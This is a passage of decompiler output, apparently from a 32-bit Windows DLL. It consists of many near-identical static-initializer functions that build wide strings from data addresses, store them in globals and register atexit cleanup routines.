//----- (100C7672) --------------------------------------------------------
int sub_100C7672()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176598);
  sub_1000D17D(dword_10186B90, v0);
  return atexit(sub_100F38AC);
}
// 10186B90: using guessed type _DWORD dword_10186B90[2];

//----- (100C7694) --------------------------------------------------------
int sub_100C7694()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101765CC);
  sub_1000D17D(dword_10186BC0, v0);
  return atexit(sub_100F38B6);
}
// 10186BC0: using guessed type _DWORD dword_10186BC0[2];

//----- (100C76B6) --------------------------------------------------------
int sub_100C76B6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176600);
  sub_1000D17D(dword_10186B70, v0);
  return atexit(sub_100F38C0);
}
// 10186B70: using guessed type _DWORD dword_10186B70[2];

//----- (100C76D8) --------------------------------------------------------
int sub_100C76D8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176634);
  sub_1000D17D(dword_10186BD8, v0);
  return atexit(sub_100F38CA);
}
// 10186BD8: using guessed type _DWORD dword_10186BD8[2];

//----- (100C76FA) --------------------------------------------------------
int sub_100C76FA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176668);
  sub_1000D17D(dword_10186B78, v0);
  return atexit(sub_100F38D4);
}
// 10186B78: using guessed type _DWORD dword_10186B78[2];

//----- (100C771C) --------------------------------------------------------
int sub_100C771C()
{
  sub_10038185(dword_10193D20);
  return atexit(sub_100F38FC);
}
// 10193D20: using guessed type _DWORD dword_10193D20[4];

//----- (100C7732) --------------------------------------------------------
int sub_100C7732()
{
  sub_100393E6(dword_10193CB8);
  return atexit(sub_100F38F2);
}
// 10193CB8: using guessed type LONG dword_10193CB8[18];

//----- (100C7748) --------------------------------------------------------
int sub_100C7748()
{
  sub_10038BE3(dword_10193D00);
  return atexit(sub_100F38E8);
}
// 10193D00: using guessed type _DWORD dword_10193D00[4];

//----- (100C775E) --------------------------------------------------------
int sub_100C775E()
{
  sub_10039550(dword_10193D10);
  return atexit(sub_100F38DE);
}
// 10193D10: using guessed type _DWORD dword_10193D10[2];

//----- (100C7774) --------------------------------------------------------
int sub_100C7774()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175F10);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186BE8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3906);
}
// 10186BE8: using guessed type _DWORD dword_10186BE8[2];

//----- (100C77C8) --------------------------------------------------------
int sub_100C77C8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176010);
  sub_1000D17D(dword_10186BE0, v0);
  return atexit(sub_100F3910);
}
// 10186BE0: using guessed type _DWORD dword_10186BE0[2];

//----- (100C77EA) --------------------------------------------------------
int sub_100C77EA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176058);
  sub_1000D17D(dword_10186BF0, v0);
  return atexit(sub_100F391A);
}
// 10186BF0: using guessed type _DWORD dword_10186BF0[2];

//----- (100C780C) --------------------------------------------------------
int sub_100C780C()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175C88);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186C00, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3924);
}
// 10186C00: using guessed type _DWORD dword_10186C00[2];

//----- (100C7860) --------------------------------------------------------
int sub_100C7860()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175CD0);
  sub_1000D17D(dword_10186C2C, v0);
  return atexit(sub_100F392E);
}
// 10186C2C: using guessed type _DWORD dword_10186C2C[2];

//----- (100C7882) --------------------------------------------------------
int sub_100C7882()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175D08);
  sub_1000D17D(dword_10186C5C, v0);
  return atexit(sub_100F3938);
}
// 10186C5C: using guessed type _DWORD dword_10186C5C[2];

//----- (100C78A4) --------------------------------------------------------
int sub_100C78A4()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175D4C);
  sub_1000D17D(dword_10186C4C, v0);
  return atexit(sub_100F3942);
}
// 10186C4C: using guessed type _DWORD dword_10186C4C[2];

//----- (100C78C6) --------------------------------------------------------
int sub_100C78C6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175D84);
  sub_1000D17D(dword_10186C34, v0);
  return atexit(sub_100F394C);
}
// 10186C34: using guessed type _DWORD dword_10186C34[2];

//----- (100C78E8) --------------------------------------------------------
int sub_100C78E8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175DBC);
  sub_1000D17D(dword_10186C54, v0);
  return atexit(sub_100F3956);
}
// 10186C54: using guessed type _DWORD dword_10186C54[2];

//----- (100C790A) --------------------------------------------------------
int sub_100C790A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175DF8);
  sub_1000D17D(dword_10186C44, v0);
  return atexit(sub_100F3960);
}
// 10186C44: using guessed type _DWORD dword_10186C44[2];

//----- (100C792C) --------------------------------------------------------
int sub_100C792C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175E30);
  sub_1000D17D(dword_10186C24, v0);
  return atexit(sub_100F396A);
}
// 10186C24: using guessed type _DWORD dword_10186C24[2];

//----- (100C794E) --------------------------------------------------------
int sub_100C794E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175E6C);
  sub_1000D17D(dword_10186C3C, v0);
  return atexit(sub_100F3974);
}
// 10186C3C: using guessed type _DWORD dword_10186C3C[2];

//----- (100C7970) --------------------------------------------------------
int sub_100C7970()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175EA0);
  v1 = sub_1000D17D(v3, v0);
  v4 = 0;
  sub_1000CE46(v1, dword_10186C10);
  v4 = -1;
  sub_1000D3AD(v3);
  return atexit(sub_100F397E);
}
// 10186C10: using guessed type _DWORD dword_10186C10[3];

//----- (100C79BE) --------------------------------------------------------
int sub_100C79BE()
{
  sub_1000D17D(dword_10186C08, asc_10175ED4);
  return atexit(sub_100F3988);
}
// 10186C08: using guessed type _DWORD dword_10186C08[2];

//----- (100C79D9) --------------------------------------------------------
int sub_100C79D9()
{
  sub_1000D17D(&dword_10186BF8, asc_10175EDC);
  return atexit(sub_100F3992);
}
// 10186BF8: using guessed type int dword_10186BF8;

//----- (100C79F4) --------------------------------------------------------
int sub_100C79F4()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175C08);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186C64, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F399C);
}
// 10186C64: using guessed type _DWORD dword_10186C64[2];

//----- (100C7A48) --------------------------------------------------------
int sub_100C7A48()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175BA8);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186C6C, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F39A6);
}
// 10186C6C: using guessed type _DWORD dword_10186C6C[2];

//----- (100C7A9C) --------------------------------------------------------
int sub_100C7A9C()
{
  sub_1003C21F((int)&dword_10186C88, 1);
  return atexit(sub_100F39B0);
}
// 10186C88: using guessed type int dword_10186C88;

//----- (100C7AB5) --------------------------------------------------------
int sub_100C7AB5()
{
  sub_1003C21F((int)&dword_10186C74, 2);
  return atexit(sub_100F39BB);
}
// 10186C74: using guessed type int dword_10186C74;

//----- (100C7ACE) --------------------------------------------------------
int sub_100C7ACE()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175A00);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186C9C, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F39C6);
}
// 10186C9C: using guessed type _DWORD dword_10186C9C[2];

//----- (100C7B22) --------------------------------------------------------
int sub_100C7B22()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175A48);
  sub_1000D17D(&dword_10186CA8, v0);
  return atexit(sub_100F39D0);
}
// 10186CA8: using guessed type int dword_10186CA8;

//----- (100C7B44) --------------------------------------------------------
int sub_100C7B44()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175A80);
  sub_1000D17D(&dword_10186CB0, v0);
  return atexit(sub_100F39DA);
}
// 10186CB0: using guessed type int dword_10186CB0;

//----- (100C7B66) --------------------------------------------------------
int sub_100C7B66()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175AC8);
  sub_1000D17D(&dword_10186CB8, v0);
  return atexit(sub_100F39E4);
}
// 10186CB8: using guessed type int dword_10186CB8;

//----- (100C7B88) --------------------------------------------------------
size_t sub_100C7B88()
{
  size_t v0; // ebx
  bool v1; // cc
  int *v2; // eax
  size_t v3; // ebp
  size_t v4; // ebx
  int *v5; // eax
  size_t result; // eax

  v0 = sub_1000D687((int)&dword_10186CB0);
  v1 = sub_1000D687((int)&dword_10186CA8) <= v0;
  v2 = &dword_10186CA8;
  if ( v1 )
    v2 = &dword_10186CB0;
  v3 = sub_1000D687((int)v2);
  if ( v3 <= sub_1000D687((int)&dword_10186CB8) )
  {
    v5 = &dword_10186CB8;
  }
  else
  {
    v4 = sub_1000D687((int)&dword_10186CB0);
    if ( sub_1000D687((int)&dword_10186CA8) <= v4 )
      v5 = &dword_10186CB0;
    else
      v5 = &dword_10186CA8;
  }
  result = 2 * sub_1000D687((int)v5);
  dword_10186CA4 = result;
  return result;
}
// 10186CA4: using guessed type int dword_10186CA4;
// 10186CA8: using guessed type int dword_10186CA8;
// 10186CB0: using guessed type int dword_10186CB0;
// 10186CB8: using guessed type int dword_10186CB8;

//----- (100C7BF4) --------------------------------------------------------
int sub_100C7BF4()
{
  int result; // eax

  result = 0;
  dword_10193D34 = 0;
  return result;
}
// 10193D34: using guessed type int dword_10193D34;

//----- (100C7C0A) --------------------------------------------------------
int sub_100C7C0A()
{
  int result; // eax

  dword_10193D38 = 0;
  result = 0;
  dword_10193D3C = 0;
  return result;
}
// 10193D38: using guessed type int dword_10193D38;
// 10193D3C: using guessed type int dword_10193D3C;

//----- (100C7C2A) --------------------------------------------------------
int sub_100C7C2A()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175890);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186CC0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F39EE);
}
// 10186CC0: using guessed type _DWORD dword_10186CC0[2];

//----- (100C7C7E) --------------------------------------------------------
int sub_100C7C7E()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175800);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186CC8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F39F8);
}
// 10186CC8: using guessed type _DWORD dword_10186CC8[2];

//----- (100C7CD2) --------------------------------------------------------
wchar_t *sub_100C7CD2()
{
  wchar_t *result; // eax

  result = (wchar_t *)sub_1000CC40((int)&unk_10175848);
  String2 = result;
  return result;
}

//----- (100C7CE3) --------------------------------------------------------
int sub_100C7CE3()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101757B0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186CD0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3A02);
}
// 10186CD0: using guessed type _DWORD dword_10186CD0[2];

//----- (100C7D37) --------------------------------------------------------
int sub_100C7D37()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175748);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186CD8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3A0C);
}
// 10186CD8: using guessed type _DWORD dword_10186CD8[2];

//----- (100C7D8B) --------------------------------------------------------
int sub_100C7D8B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101756E4);
  sub_1000D17D(&dword_10186CE4, v0);
  return atexit(sub_100F3A16);
}
// 10186CE4: using guessed type int dword_10186CE4;

//----- (100C7DAD) --------------------------------------------------------
int sub_100C7DAD()
{
  int result; // eax

  result = *(_DWORD *)(dword_10186CE8 + 28);
  dword_10186CE0 = result;
  return result;
}
// 10186CE0: using guessed type int dword_10186CE0;
// 10186CE8: using guessed type int dword_10186CE8;

//----- (100C7DBB) --------------------------------------------------------
int sub_100C7DBB()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175530);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186CEC, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3A20);
}
// 10186CEC: using guessed type _DWORD dword_10186CEC[2];

//----- (100C7E0F) --------------------------------------------------------
int sub_100C7E0F()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175198);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186CF4, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3A2A);
}
// 10186CF4: using guessed type _DWORD dword_10186CF4[2];

//----- (100C7E63) --------------------------------------------------------
int sub_100C7E63()
{
  int result; // eax

  result = sub_1000CC40((int)&unk_10175298);
  *(_DWORD *)ArgList = result;
  return result;
}

//----- (100C7E74) --------------------------------------------------------
int sub_100C7E74()
{
  int result; // eax

  result = sub_1000CC40((int)&unk_10175310);
  *(_DWORD *)dword_1017DB44 = result;
  return result;
}

//----- (100C7E85) --------------------------------------------------------
wchar_t *sub_100C7E85()
{
  wchar_t *result; // eax

  result = (wchar_t *)sub_1000CC40((int)&unk_10175378);
  dword_1017DB40 = result;
  return result;
}

//----- (100C7E96) --------------------------------------------------------
wchar_t *sub_100C7E96()
{
  wchar_t *result; // eax

  result = (wchar_t *)sub_1000CC40((int)&unk_101753D0);
  dword_1017DB38 = result;
  return result;
}

//----- (100C7EA7) --------------------------------------------------------
int sub_100C7EA7()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017542C);
  sub_1000D17D(dword_10186D14, v0);
  return atexit(sub_100F3A34);
}
// 10186D14: using guessed type _DWORD dword_10186D14[2];

//----- (100C7EC9) --------------------------------------------------------
int sub_100C7EC9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017545C);
  sub_1000D17D(dword_10186D04, v0);
  return atexit(sub_100F3A3E);
}
// 10186D04: using guessed type _DWORD dword_10186D04[2];

//----- (100C7EEB) --------------------------------------------------------
int sub_100C7EEB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175490);
  sub_1000D17D(dword_10186CFC, v0);
  return atexit(sub_100F3A48);
}
// 10186CFC: using guessed type _DWORD dword_10186CFC[2];

//----- (100C7F0D) --------------------------------------------------------
int sub_100C7F0D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101754C0);
  sub_1000D17D(dword_10186D0C, v0);
  return atexit(sub_100F3A52);
}
// 10186D0C: using guessed type _DWORD dword_10186D0C[2];

//----- (100C7F2F) --------------------------------------------------------
int sub_100C7F2F()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174EB0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186D6C, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3A5C);
}
// 10186D6C: using guessed type _DWORD dword_10186D6C[2];

//----- (100C7F83) --------------------------------------------------------
_DWORD *sub_100C7F83()
{
  return sub_10045454(0x7FFFFFFF, 0, &dword_10186E44);
}
// 10186E44: using guessed type int dword_10186E44;

//----- (100C7F95) --------------------------------------------------------
_DWORD *sub_100C7F95()
{
  return sub_10045454(-1, -1, &dword_10186DB0);
}
// 10186DB0: using guessed type int dword_10186DB0;

//----- (100C7FA5) --------------------------------------------------------
int sub_100C7FA5()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174EF8);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186D30);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3A66);
}
// 10186D30: using guessed type _DWORD dword_10186D30[3];
// 100C7FA5: using guessed type int var_28[5];

//----- (100C800E) --------------------------------------------------------
int sub_100C800E()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174F24);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186EB0);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3A70);
}
// 10186EB0: using guessed type _DWORD dword_10186EB0[5];
// 100C800E: using guessed type int var_28[5];

//----- (100C8077) --------------------------------------------------------
int sub_100C8077()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174F88);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186DCC);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3A7A);
}
// 10186DCC: using guessed type _DWORD dword_10186DCC[5];
// 100C8077: using guessed type int var_28[5];

//----- (100C80E0) --------------------------------------------------------
int sub_100C80E0()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174F54);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186DE0);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3A84);
}
// 10186DE0: using guessed type _DWORD dword_10186DE0[3];
// 100C80E0: using guessed type int var_28[5];

//----- (100C8149) --------------------------------------------------------
int sub_100C8149()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10174FC8);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186E60);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3A8E);
}
// 10186E60: using guessed type _DWORD dword_10186E60[5];
// 100C8149: using guessed type int var_28[5];

//----- (100C81B2) --------------------------------------------------------
int sub_100C81B2()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175004);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186E08);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3A98);
}
// 10186E08: using guessed type _DWORD dword_10186E08[3];
// 100C81B2: using guessed type int var_28[5];

//----- (100C821B) --------------------------------------------------------
int sub_100C821B()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175038);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186E88);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3AA2);
}
// 10186E88: using guessed type _DWORD dword_10186E88[3];
// 100C821B: using guessed type int var_28[5];

//----- (100C8284) --------------------------------------------------------
int sub_100C8284()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, asc_10175074);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)dword_10186D58);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3AAC);
}
// 10186D58: using guessed type _DWORD dword_10186D58[3];
// 100C8284: using guessed type int var_28[5];

//----- (100C82E6) --------------------------------------------------------
int sub_100C82E6()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, asc_10175078);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)dword_10186D9C);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3AB6);
}
// 10186D9C: using guessed type _DWORD dword_10186D9C[5];
// 100C82E6: using guessed type int var_28[5];

//----- (100C8348) --------------------------------------------------------
int sub_100C8348()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017507C);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186E4C);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3AC0);
}
// 10186E4C: using guessed type _DWORD dword_10186E4C[5];
// 100C8348: using guessed type int var_28[5];

//----- (100C83B1) --------------------------------------------------------
int sub_100C83B1()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101750AC);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186D1C);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3ACA);
}
// 10186D1C: using guessed type _DWORD dword_10186D1C[5];
// 100C83B1: using guessed type int var_28[5];

//----- (100C841A) --------------------------------------------------------
int sub_100C841A()
{
  _DWORD *v0; // eax
  _DWORD *v1; // eax
  int v3[5]; // [esp+10h] [ebp-28h] BYREF
  int v4[4]; // [esp+24h] [ebp-14h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v0 = sub_1000D17D(v4, asc_101750E0);
  v5 = 0;
  v1 = sub_1000CE46(v0, v3);
  LOBYTE(v5) = 1;
  sub_1000B36F(v1, (int)&dword_10186E1C);
  LOBYTE(v5) = 0;
  sub_1000B3DF(v3);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3AD4);
}
// 10186E1C: using guessed type int dword_10186E1C;
// 100C841A: using guessed type int var_28[5];

//----- (100C847C) --------------------------------------------------------
int sub_100C847C()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101750E4);
  v1 = sub_1000D17D(v5, v0);
  v6 = 0;
  v2 = sub_1000CE46(v1, v4);
  LOBYTE(v6) = 1;
  sub_1000B36F(v2, (int)dword_10186D44);
  LOBYTE(v6) = 0;
  sub_1000B3DF(v4);
  v6 = -1;
  sub_1000D3AD(v5);
  return atexit(sub_100F3ADE);
}
// 10186D44: using guessed type _DWORD dword_10186D44[3];
// 100C847C: using guessed type int var_28[5];

//----- (100C84E5) --------------------------------------------------------
int sub_100C84E5()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  int v5[4]; // [esp+24h] [ebp-14h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10175120);
